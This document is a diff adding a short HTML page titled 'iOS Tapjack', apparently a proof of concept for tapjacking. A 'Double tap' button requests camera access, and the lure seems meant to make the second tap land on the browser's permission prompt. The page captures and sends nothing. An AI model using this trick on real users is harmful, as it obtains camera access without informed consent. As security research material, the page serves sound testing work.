@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iOS Tapjack</title>
+    <style>
+        .red-button {
+            position: relative;
+            top: 45vh;
+            left: 45vw;
+            background-color: rgb(79, 235, 89);
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+    <script>
+        function requestCamera() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then((stream) => {
+                        alert('Camera access granted');
+                        // You can now use the stream for video capture
+                    })
+                    .catch((error) => {
+                        alert('Error accessing camera: ' + error.message);
+                    });
+            } else {
+                alert('Camera access is not supported by this browser.');
+            }
+        }
+    </script>
+</head>
+<body>
+    <button class="red-button" onclick="requestCamera()">Double tap</button>
+</body>
+</html>
